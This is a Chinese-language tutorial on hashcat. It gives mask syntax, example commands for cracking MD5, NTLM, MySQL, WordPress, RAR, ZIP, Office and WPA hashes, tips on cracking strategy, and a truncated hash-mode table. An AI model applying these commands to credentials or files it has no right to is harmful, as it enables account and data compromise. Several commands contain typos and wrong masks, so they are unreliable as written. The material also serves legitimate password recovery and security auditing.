<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">l | abcdefghijklmnopqrstuvwxyz          纯小写字母(lower)</span></pre></td></tr><tr><td class="code"><pre><span class="line">u | ABCDEFGHIJKLMNOPQRSTUVWXYZ          纯大写字母(upper)</span></pre></td></tr><tr><td class="code"><pre><span class="line">d | 0123456789                  	    纯数字(decimal)</span></pre></td></tr><tr><td class="code"><pre><span class="line">h | 0123456789abcdef                	常见小写子目录和数字(hex)</span></pre></td></tr><tr><td class="code"><pre><span class="line">H | 0123456789ABCDEF               		常见大写字母和数字(HEX)</span></pre></td></tr><tr><td class="code"><pre><span class="line">s |  !&quot;#$%&amp;&#39;()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[\]^_&#96;&#123;|&#125;~    特殊字符(special)</span></pre></td></tr><tr><td class="code"><pre><span class="line">a | ?l?u?d?s                   		 	键盘上所有可见的字符(all_printable)</span></pre></td></tr><tr><td class="code"><pre><span class="line">b | 0x00 - 0xff                 		可能是用来匹配像空格这种密码的(bin)</span></pre></td></tr></table></figure>

<ul>
<li><strong>eg：</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">八位数字密码：?d?d?d?d?d?d?d?d</span></pre></td></tr><tr><td class="code"><pre><span class="line">八位未知密码：?a?a?a?a?a?a?a?a</span></pre></td></tr><tr><td class="code"><pre><span class="line">前四位为大写字母，后面四位为数字：?u?u?u?u?d?d?d?d</span></pre></td></tr><tr><td class="code"><pre><span class="line">前四位为数字或者是小写字母，后四位为大写字母或者数字：?h?h?h?h?H?H?H?H</span></pre></td></tr><tr><td class="code"><pre><span class="line">前三个字符未知，中间为admin，后三位未知：?a?a?aadmin?a?a?a</span></pre></td></tr><tr><td class="code"><pre><span class="line">6-8位数字密码：--increment --increment-min 6 --increment-max 8 ?l?l?l?l?l?l?l?l</span></pre></td></tr><tr><td class="code"><pre><span class="line">6-8位数字+小写字母密码：--increment --increment-min 6 --increment-max 8 ?h?h?h?h?h?h?h?h</span></pre></td></tr></table></figure>




</li>
</ul>
</li>
</ul>
<ul>
<li><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><pre><code>- #### 7位数字破解</code></pre></li>
</ul>
<pre><code> `    hashcat -a 3 -m 0 --force 25c3e88f81b4853f2a8faacad4c871b6 ?d?d?d?d?d?d?d`

- #### 7位小写字母破解

  `hashcat -a 3 -m 0 --force 4488cec2aea535179e085367d8a17d75 ?l?l?l?l?l?l?l`

- #### 1-8位小写字母+数字破解

  `hashcat -a 3 -m 0 --force 4488cec2aea535179e085367d8a17d75 --incement --increment-min 1 --inrement-max 8 h?h?h?h?h??h?h?h`

- #### 1-8位为特定字符集：123456abcdf!@+-

  `hashcat -a 3 -m 0 --force -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d --increment --increment-min 1 --increment-max 8 ?1?1?1?1?1?1?1?1?1?1`

- ####  1-8位数字+大小写字母+可见特殊符号

  `hashcat -a 3 -m 0 --force -1 ?d?l?u?s d37fc9ee39dd45a7717e3e3e9415f65d --increment --increment-min 1 --increment-max 8 ?1?1?1?1?1?1?1?1`

  or

   `hashcat -a 3 -m 0 --force  d37fc9ee39dd45a7717e3e3e9415f65d --increment --increment-min 1 --increment-max 8 ?a?a?a?a?a?a?a?a`

- #### 字典破解

  `hashcat -a 0 -m 0 --force [hash] password.txt -o ./result`

  #### 批量爆破

  `hashcat -a 0 -m 0 --force [hashfile] password.txt -o ./result`

- #### 字典组合破解

  `hashcat -a 1 -m 0 --force [hash] pwd1.txt pwd2.txt`

- #### 字典加掩码破解

  `hashcat -a 6 9dc9d5ed5031367d42543763423c24ee pwd.txt ?l?l?l?l?l`</code></pre><ul>
<li><h3 id="密码类型实例"><a href="#密码类型实例" class="headerlink" title="密码类型实例"></a>密码类型实例</h3><ul>
<li><h4 id="mysql4-1-5-passwod"><a href="#mysql4-1-5-passwod" class="headerlink" title="mysql4.1/5 passwod"></a>mysql4.1/5 passwod</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat -a 3 -m 300 --force 6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 ?d?d?d?d?d?d</span></pre></td></tr></table></figure>
</li>
<li><h4 id="sha512crypt-6-SHA512-Unix-破解"><a href="#sha512crypt-6-SHA512-Unix-破解" class="headerlink" title="sha512crypt $6$, SHA512 (Unix)破解"></a>sha512crypt $6$, SHA512 (Unix)破解</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcate -a 3 -m 1800 --force $6$mxuA5cdy$XZRk0CvnPFqOgVopqiPEFAFK72SogKVwwwp7gWaUOb7b6tVwfCpcSUsCEk64ktLLYmzyew&#x2F;xd0O0hPG&#x2F;yrm2X. ?l?l?l?l</span></pre></td></tr></table></figure>

<p>不用整理用户名，使用–username</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat -a 3 -m 1800 --force qiyou:$6$QDq75ki3$jsKm7qTDHz&#x2F;xBob0kF1Lp170Cgg0i5Tslf3JW&#x2F;sm9k9Q916mBTyilU3PoOsbRdxV8TAmzvdgNjrCuhfg3jKMY1 ?l?l?l?l?l --username</span></pre></td></tr></table></figure>
</li>
<li><h4 id="Windows-NT-hash，LM-hash破解"><a href="#Windows-NT-hash，LM-hash破解" class="headerlink" title="Windows NT-hash，LM-hash破解"></a>Windows NT-hash，LM-hash破解</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NT-hash:</span></pre></td></tr><tr><td class="code"><pre><span class="line">hashcat -a 3 -m 1000 209C6174DA490CAEB422F3FA5A7AE634 ?l?l?l?l?l</span></pre></td></tr><tr><td class="code"><pre><span class="line">LM-hash:</span></pre></td></tr><tr><td class="code"><pre><span class="line">hashcat -a 3 -m 3000 F0D412BD764FFE81AAD3B435B51404EE ?l?l?l?l?l</span></pre></td></tr></table></figure>
</li>
<li><h4 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat -a 3 -m 132 --force 0x01008c8006c224f71f6bf0036f78d863c3c4ff53f8c3c48edafb ?l?l?l?l?l?d?d?d</span></pre></td></tr></table></figure>
</li>
<li><h4 id="wordpress密码hash破解"><a href="#wordpress密码hash破解" class="headerlink" title="wordpress密码hash破解"></a>wordpress密码hash破解</h4><p> 具体加密脚本在<code>./wp-includes/class-phpass.php</code>的<code>HashPassword</code>函数 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat -a 3 -m 400 --force $P$BYEYcHEj3vDhV1lwGBv6rpxurKOEWY&#x2F; ?d?d?d?d?d?d</span></pre></td></tr></table></figure>
</li>
<li><h4 id="discuz用户密码hash破解"><a href="#discuz用户密码hash破解" class="headerlink" title="discuz用户密码hash破解"></a>discuz用户密码hash破解</h4><p> 其密码加密方式md5(md5($pass).$salt) </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat -a 3 -m 2611 --force 14e1b600b1fd579f47433b88e8d85291: ?d?d?d?d?d?d</span></pre></td></tr></table></figure>
</li>
<li><h4 id="破解RAR压缩密码"><a href="#破解RAR压缩密码" class="headerlink" title="破解RAR压缩密码"></a>破解RAR压缩密码</h4><p> 首先rar2john获取rar文件hash值 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rar2john.exe 1.rar</span></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcate -a 3 -m 13000 --force $rar5$16$639e9ce8344c680da12e8bdd4346a6a3$15$a2b056a21a9836d8d48c2844d171b73d$8$04a52d2224ad082e ?d?d?d?d?d?d</span></pre></td></tr></table></figure>

<p>注意：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat 支持 RAR3-hp 和 RAR5，官方示例如下：</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">-m参数    类型      示例 hash</span></pre></td></tr><tr><td class="code"><pre><span class="line">12500    RAR3-hp    $RAR3$*0*45109af8ab5f297a*adbf6c5385d7a40373e8f77d7b89d317</span></pre></td></tr><tr><td class="code"><pre><span class="line">13000    RAR5       $rar5$16$74575567518807622265582327032280$15$f8b4064de34ac02ecabfe</span></pre></td></tr></table></figure>
</li>
<li><h4 id="zip密码破解"><a href="#zip密码破解" class="headerlink" title="zip密码破解"></a>zip密码破解</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zip2john.exe 1.zip</span></pre></td></tr><tr><td class="code"><pre><span class="line">结果：1.zip:$zip2$*0*3*0*554bb43ff71cb0cac76326f292119dfd*ff23*5*24b28885ee*d4fe362bb1e91319ab53*$&#x2F;zip2$:::::1.zip-1.txt</span></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat -a 3 -m 13600 $zip2$*0*3*0*554bb43ff71cb0cac76326f292119dfd*ff23*5*24b28885ee*d4fe362bb1e91319ab53*$&#x2F;zip2$ --force ?d?d?d?d?d?d</span></pre></td></tr></table></figure>
</li>
<li><h4 id="破解office密码"><a href="#破解office密码" class="headerlink" title="破解office密码"></a>破解office密码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获取office的hash值：python office2john.py 11.docx</span></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat -a 3 -m 9600 $office$*2013*100000*256*16*e4a3eb62e8d3576f861f9eded75e0525*9eeb35f0849a7800d48113440b4bbb9c*577f8d8b2e1c5f60fed76e62327b38d28f25230f6c7dfd66588d9ca8097aabb9 --force ?d?d?d?d?d?d</span></pre></td></tr></table></figure>
</li>
<li><h4 id="破解WIFI密码"><a href="#破解WIFI密码" class="headerlink" title="破解WIFI密码"></a>破解WIFI密码</h4><p>首先先把我们的握手包转化为hccapx格式，现在最新版的hashcat只支持hccapx格式了，以前的hccap格式已经不支持了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">官方在线转化https:&#x2F;&#x2F;hashcat.net&#x2F;cap2hccapx&#x2F;</span></pre></td></tr><tr><td class="code"><pre><span class="line">hashcat -a 3 -m 2500 1.hccapx 1391040?d?d?d?d</span></pre></td></tr></table></figure>



</li>
</ul>
</li>
</ul>
<ul>
<li><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol>
<li><p>对于破解过的hash值，用<code>hashcat64.exe hash --show</code>查看结果</p>
</li>
<li><p>所有的hash破解结果都在hashcat.potfile文件中</p>
</li>
<li><p>如果破解的时间太长，可以按s键可以查看破解的状态，p键暂停，r键继续破解，q键退出破解。</p>
</li>
<li><p>在使用GPU模式进行破解时，可以使用-O参数自动进行优化</p>
</li>
<li><p>在实际破解中的建议，如果我们盲目的去破解，会占用我们大量的时间和资源</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.首先走一遍常用的弱口令字典</span></pre></td></tr><tr><td class="code"><pre><span class="line">2.组合密码，如：zhang1999，用姓氏和出生年组合，当然也可以用其它的组合，这里举个例子而已</span></pre></td></tr><tr><td class="code"><pre><span class="line">3.把常用的掩码组合整理起来放在masks中的.hcmask文件中，然后让它自动加载破解</span></pre></td></tr><tr><td class="code"><pre><span class="line">4.如果实在不行，你可以尝试低位数的所有组合去跑，不过不建议太高位数的组合去破解，因为如果对方设置的密码很复杂的话，到头来你密码没有破解到，却浪费了大量的时间和资源，得不偿失</span></pre></td></tr></table></figure>

<p>6.HashCat参数优化<br> 考虑到hashcat的破解速度以及资源的分配，我们可以对一些参数进行配置</p>
<ol>
<li>Workload tuning 负载调优。<br> 该参数支持的值有1,8,40,80,160  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--gpu-accel 160 可以让GPU发挥最大性能。</span></pre></td></tr></table></figure></li>
<li>Gpu loops 负载微调  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--gpu-loops 1024 可以让GPU发挥最大性能。</span></pre></td></tr></table></figure></li>
<li>Segment size 字典缓存大小 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--segment-size 512 可以提高大字典破解的速度。</span></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
</li>
<li><h3 id="m-参数加密类型"><a href="#m-参数加密类型" class="headerlink" title="m 参数加密类型"></a>m 参数加密类型</h3>  <figure class="highlight plain"><figcaption><span>[ Hash modes ] -</span></figcaption><table><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    # | Name                                             | Category</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span></pre></td></tr><tr><td class="code"><pre><span class="line">  900 | MD4                                              | Raw Hash</span></pre></td></tr><tr><td class="code"><pre><span class="line">    0 | MD5                                              | Raw Hash</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 5100 | Half MD5                                         | Raw Hash</span></pre></td></tr><tr><td class="code"><pre><span class="line">  100 | SHA1                                             | Raw Hash</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 1300 | SHA2-224                                         | Raw Hash</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 1400 | SHA2-256                                         | Raw Hash</span></pre></td></tr><tr><td class="code"><pre><span class="line">10800 | SHA2-384                                         | Raw Hash</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 1700 | SHA2-512                                         | Raw Hash</span></pre></td></tr><tr><td class="code"><pre><span class="line">17300 | SHA3-224                                         | Raw Hash</span></pre></td></tr><tr><td class="code"><pre><span class="line">17400 | SHA3-256                                         | Raw Hash</span></pre></td></tr><tr><td class="code"><pre><span class="line">17500 | SHA3-384                                         | Raw Hash</span></pre></td></tr><tr><td class="code"><pre><span class="line">17600 | SHA3-512                                         | Raw Hash</span></pre></td></tr><tr><td class="code"><pre><span class="line">17700 | Keccak-224                                       | Raw Hash</span></pre></td></tr><tr><td class="code"><pre><span class="line">17800 | Keccak-256                                       | Raw Hash</span></pre></td></tr><tr><td class="code"><pre><span class="line">17900 | Keccak-384                                       | Raw Hash</span></pre></td></tr><tr><td class="code"><pre><span class="line">18000 | Keccak-512                                       | Raw Hash</span></pre></td></tr><tr><td class="code"><pre><span class="line">  600 | BLAKE2b-512                                      | Raw Hash</span></pre></td></tr><tr><td class="code"><pre><span class="line">10100 | SipHash                                          | Raw Hash</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 6000 | RIPEMD-160                                       | Raw Hash</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 6100 | Whirlpool                                        | Raw Hash</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 6900 | GOST R 34.11-94                                  | Raw Hash</span></pre></td></tr><tr><td class="code"><pre><span class="line">11700 | GOST R 34.11-2012 (Streebog) 256-bit, big-endian | Raw Hash</span></pre></td></tr><tr><td class="code"><pre><span class="line">11800 | GOST R 34.11-2012 (Streebog) 512-bit, big-endian | Raw Hash</span></pre></td></tr><tr><td class="code"><pre><span class="line">   10 | md5($pass.$salt)                                 | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="code"><pre><span class="line">   20 | md5($salt.$pass)                                 | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="code"><pre><span class="line">   30 | md5(utf16le($pass).$salt)                        | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="code"><pre><span class="line">   40 | md5($salt.utf16le($pass))                        | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 3800 | md5($salt.$pass.$salt)                           | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 3710 | md5($salt.md5($pass))                            | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 4010 | md5($salt.md5($salt.$pass))                      | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 4110 | md5($salt.md5($pass.$salt))                      | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 2600 | md5(md5($pass))                                  | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 3910 | md5(md5($pass).md5($salt))                       | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 4300 | md5(strtoupper(md5($pass)))                      | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 4400 | md5(sha1($pass))                                 | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="code"><pre><span class="line">  110 | sha1($pass.$salt)                                | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="code"><pre><span class="line">  120 | sha1($salt.$pass)                                | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="code"><pre><span class="line">  130 | sha1(utf16le($pass).$salt)                       | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="code"><pre><span class="line">  140 | sha1($salt.utf16le($pass))                       | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 4500 | sha1(sha1($pass))                                | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 4520 | sha1($salt.sha1($pass))                          | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 4700 | sha1(md5($pass))                                 | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 4900 | sha1($salt.$pass.$salt)                          | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="code"><pre><span class="line">14400 | sha1(CX)                                         | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 1410 | sha256($pass.$salt)                              | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 1420 | sha256($salt.$pass)                              | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 1430 | sha256(utf16le($pass).$salt)                     | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 1440 | sha256($salt.utf16le($pass))                     | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 1710 | sha512($pass.$salt)                              | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 1720 | sha512($salt.$pass)                              | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 1730 | sha512(utf16le($pass).$salt)                     | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 1740 | sha512($salt.utf16le($pass))                     | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="code"><pre><span class="line">   50 | HMAC-MD5 (key &#x3D; $pass)                           | Raw Hash, Authenticated</span></pre></td></tr><tr><td class="code"><pre><span class="line">   60 | HMAC-MD5 (key &#x3D; $salt)                           | Raw Hash, Authenticated</span></pre></td></tr><tr><td class="code"><pre><span class="line">  150 | HMAC-SHA1 (key &#x3D; $pass)                          | Raw Hash, Authenticated</span></pre></td></tr><tr><td class="code"><pre><span class="line">  160 | HMAC-SHA1 (key &#x3D; $salt)                          | Raw Hash, Authenticated</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 1450 | HMAC-SHA256 (key &#x3D; $pass)                        | Raw Hash, Authenticated</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 1460 | HMAC-SHA256 (key &#x3D; $salt)                        | Raw Hash, Authenticated</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 1750 | HMAC-SHA512 (key &#x3D; $pass)                        | Raw Hash, Authenticated</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 1760 | HMAC-SHA512 (key &#x3D; $salt)                        | Raw Hash, Authenticated</span></pre></td></tr><tr><td class="code"><pre><span class="line">11750 | HMAC-Streebog-256 (key &#x3D; $pass), big-endian      | Raw Hash, Authenticated</span></pre></td></tr><tr><td class="code"><pre><span class="line">11760 | HMAC-Streebog-256 (key &#x3D; $salt), big-endian      | Raw Hash, Authenticated</span></pre></td></tr><tr><td class="code"><pre><span class="line">11850 | HMAC-Streebog-512 (key &#x3D; $pass), big-endian      | Raw Hash, Authenticated</span></pre></td></tr><tr><td class="code"><pre><span class="line">11860 | HMAC-Streebog-512 (key &#x3D; $salt), big-endian      | Raw Hash, Authenticated</span></pre></td></tr><tr><td class="code"><pre><span class="line">14000 | DES (PT &#x3D; $salt, key &#x3D; $pass)                    | Raw Cipher, Known-Plaintext attack</span></pre></td></tr><tr><td class="code"><pre><span class="line">14100 | 3DES (PT &#x3D; $salt, key &#x3D; $pass)                   | Raw Cipher, Known-Plaintext attack</span></pre></td></tr><tr><td class="code"><pre><span class="line">14900 | Skip32 (PT &#x3D; $salt, key &#x3D; $pass)                 | Raw Cipher, Known-Plaintext attack</span></pre></td></tr><tr><td class="code"><pre><span class="line">15400 | ChaCha20                                         | Raw Cipher, Known-Plaintext attack</span></pre></td></tr><tr><td class="code"><pre><span class="line">  400 | phpass                                           | Generic KDF</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 8900 | scrypt                                           | Generic KDF</span></pre></td></tr><tr><td class="code"><pre><span class="line">11900 | PBKDF2-HMAC-MD5                                  | Generic KDF</span></pre></td></tr><tr><td class="code"><pre><span class="line">12000 | PBKDF2-HMAC-SHA1                                 | Generic KDF</span></pre></td></tr><tr><td class="code"><pre><span class="line">10900 | PBKDF2-HMAC-SHA256                               | Generic KDF</span></pre></td></tr><tr><td class="code"><pre><span class="line">12100 | PBKDF2-HMAC-SHA512                               | Generic KDF</span></pre></td></tr><tr><td class="code"><pre><span class="line">   23 | Skype                                            | Network Protocols</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 2500 | WPA-EAPOL-PBKDF2                                 | Network Protocols</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 2501 | WPA-EAPOL-PMK                                    | Network Protocols</span></pre></td></tr><tr><td class="code"><pre><span class="line">16800 | WPA-PMKID-PBKDF2                                 | Network Protocols</span></pre></td></tr><tr><td class="code"><pre><span class="line">16801 | WPA-PMKID-PMK                                    | Network Protocols</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 4800 | iSCSI CHAP authentication, MD5(CHAP)             | Network Protocols</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 5300 | IKE-PSK MD5                                      | Network Protocols</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 5400 | IKE-PSK SHA1                                     | Network Protocols</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 5500 | NetNTLMv1                                        | Network Protocols</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 5500 | NetNTLMv1+ESS                                    | Network Protocols</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 5600 | NetNTLMv2                                        | Network Protocols</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 7300 | IPMI2 RAKP HMAC-SHA1                             | Network Protocols</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 7500 | Kerberos 5 AS-REQ Pre-Auth etype 23              | Network Protocols</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 8300 | DNSSEC (NSEC3)                                   | Network Protocols</span></pre></td></tr><tr><td class="code"><pre><span class="line">10200 | CRAM-MD5                                         | Network Protocols</span></pre></td></tr><tr><td class="code"><pre><span class="line">11100 | PostgreSQL CRAM (MD5)                            | Network Protocols</span></pre></td></tr><tr><td class="code"><pre><span class="line">11200 | MySQL CRAM (SHA1)                                | Network Protocols</span></pre></td></tr><tr><td class="code"><pre><span class="line">11400 | SIP digest authentication (MD5)                  | Network Protocols</span></pre></td></tr><tr><td class="code"><pre><span class="line">13100 | Kerberos 5 TGS-REP etype 23                      | Network Protocols</span></pre></td></tr><tr><td class="code"><pre><span class="line">16100 | TACACS+                                          | Network Protocols</span></pre></td></tr><tr><td class="code"><pre><span class="line">16500 | JWT (JSON Web Token)                             | Network Protocols</span></pre></td></tr><tr><td class="code"><pre><span class="line">18200 | Kerberos 5 AS-REP etype 23                       | Network Protocols</span></pre></td></tr><tr><td class="code"><pre><span class="line">  121 | SMF (Simple Machines Forum) &gt; v1.1               | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="code"><pre><span class="line">  400 | phpBB3 (MD5)                                     | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 2611 | vBulletin &lt; v3.8.5                               | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 2711 | vBulletin &gt;&#x3D; v3.8.5                              | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 2811 | MyBB 1.2+                                        | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 2811 | IPB2+ (Invision Power Board)                     | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 8400 | WBB3 (Woltlab Burning Board)                     | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="code"><pre><span class="line">   11 | Joomla &lt; 2.5.18                                  | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="code"><pre><span class="line">  400 | Joomla &gt;&#x3D; 2.5.18 (MD5)                           | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="code"><pre><span class="line">  400 | WordPress (MD5)                                  | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 2612 | PHPS                                             | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 7900 | Drupal7                                          | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="code"><pre><span class="line">   21 | osCommerce                                       | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="code"><pre><span class="line">   21 | xt:Commerce                                      | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="code"><pre><span class="line">11000 | PrestaShop                                       | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="code"><pre><span class="line">  124 | Django (SHA-1)                                   | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="code"><pre><span class="line">10000 | Django (PBKDF2-SHA256)                           | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="code"><pre><span class="line">16000 | Tripcode                                         | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 3711 | MediaWiki B type                                 | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="code"><pre><span class="line">13900 | OpenCart                                         | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 4521 | Redmine                                          | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 4522 | PunBB                                            | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="code"><pre><span class="line">12001 | Atlassian (PBKDF2-HMAC-SHA1)                     | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="code"><pre><span class="line">   12 | PostgreSQL                                       | Database Server</span></pre></td></tr><tr><td class="code"><pre><span class="line">  131 | MSSQL (2000)                                     | Database Server</span></pre></td></tr><tr><td class="code"><pre><span class="line">  132 | MSSQL (2005)                                     | Database Server</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 1731 | MSSQL (2012, 2014)                               | Database Server</span></pre></td></tr><tr><td class="code"><pre><span class="line">  200 | MySQL323                                         | Database Server</span></pre></td></tr><tr><td class="code"><pre><span class="line">  300 | MySQL4.1&#x2F;MySQL5                                  | Database Server</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 3100 | Oracle H: Type (Oracle 7+)                       | Database Server</span></pre></td></tr><tr><td class="code"><pre><span class="line">  112 | Oracle S: Type (Oracle 11+)                      | Database Server</span></pre></td></tr><tr><td class="code"><pre><span class="line">12300 | Oracle T: Type (Oracle 12+)                      | Database Server</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 8000 | Sybase ASE                                       | Database Server</span></pre></td></tr><tr><td class="code"><pre><span class="line">  141 | Episerver 6.x &lt; .NET 4                           | HTTP, SMTP, LDAP Server</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 1441 | Episerver 6.x &gt;&#x3D; .NET 4           